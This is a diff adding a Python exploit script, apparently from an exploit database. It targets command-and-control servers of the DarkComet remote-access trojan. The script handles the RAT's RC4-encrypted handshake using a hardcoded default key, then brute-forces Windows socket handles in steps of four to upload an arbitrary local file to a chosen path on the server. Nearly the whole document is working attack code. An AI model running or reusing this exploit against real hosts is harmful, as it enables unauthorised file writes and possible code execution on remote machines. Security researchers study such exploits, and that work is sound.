@@ -1,0 +1,82 @@
+#!/usr/bin/env python3
+#
+# EDB Note: Source ~ https://gist.github.com/PseudoLaboratories/260b6f24844785aacc1e2fb61dd05c01/259944bd94a0d289ef80b9138c1e3f97a97aa9cd
+#
+
+from time import sleep
+from socket import socket, AF_INET, SOCK_STREAM, error
+from re import search
+from Crypto.Cipher import ARC4
+from binascii import hexlify, unhexlify
+
+import argparse
+
+def good(text):
+    print('[+] ' + text)
+
+def bad(text):
+    print('[-] ' + text)
+
+def normal(text):
+    print('[*] ' + text)
+
+def decrypt(data, key):
+    return ARC4.new(key).decrypt(unhexlify(data)).upper()
+
+def encrypt(data, key):
+    return hexlify(ARC4.new(key).encrypt(data)).upper()
+
+def upload(domain, port, key, local, remote, test):
+    remote = remote.replace('\\', '/')
+    f = open(local, "rb")
+    client = socket(AF_INET, SOCK_STREAM)
+    client.settimeout(5.0)
+    client.connect((domain, port))
+    try:
+        idtype = decrypt(client.recv(12), key)
+        if idtype != b'IDTYPE':
+            bad('Key seems to be wrong!')
+            return
+
+        filetransfer = encrypt('FILETRANSFER111|%s' % test, key)
+        client.send(filetransfer)
+        client.recv(3)
+        client.send(b'FILEBOF' + remote.encode('utf-8') + b'|111')
+        client.recv(1)
+        content = f.read()
+        current = 0
+        while (current + 1024) < len(content):
+            current += client.send(content[current:current+1024])
+            client.recv(1)
+        client.send(content[current:len(content)])
+        client.recv(1)
+        client.send(b'FILEEOF')
+        client.recv(1)
+        client.send(b'FILEEND')
+        client.close()
+        return True
+    except error as e:
+        client.close()
+    return False
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='bruteforce socket handle and upload arbitrary files to DarkComet servers')
+    parser.add_argument('--port', '-p', dest='port', type=int, default=1604, help='port of the DarkComet server')
+    parser.add_argument('--key', '-k', dest='key', default='#KCMDDC51#-890', help='password of the DarkComet server')
+    parser.add_argument('--start', '-s', dest='start', type=int, default=0)
+    parser.add_argument('--end', '-e', dest='end', type=int, default=2400)
+
+    parser.add_argument('domain', help='domain name/ip of the DarkComet server')
+    parser.add_argument('local', help='file name of the local file')
+    parser.add_argument('remote', help='remote relative file path')
+
+    args = parser.parse_args()
+
+    for i in range(args.start, args.end, 4):
+        # Increment by 4 because Windows seems to only
+        # generate socket handles that are multiples of 4
+        normal('Trying ' + str(i))
+        if upload(args.domain, args.port, args.key, args.local, args.remote, i):
+            good('Uploaded successfully!')
+            break
+        sleep(2)
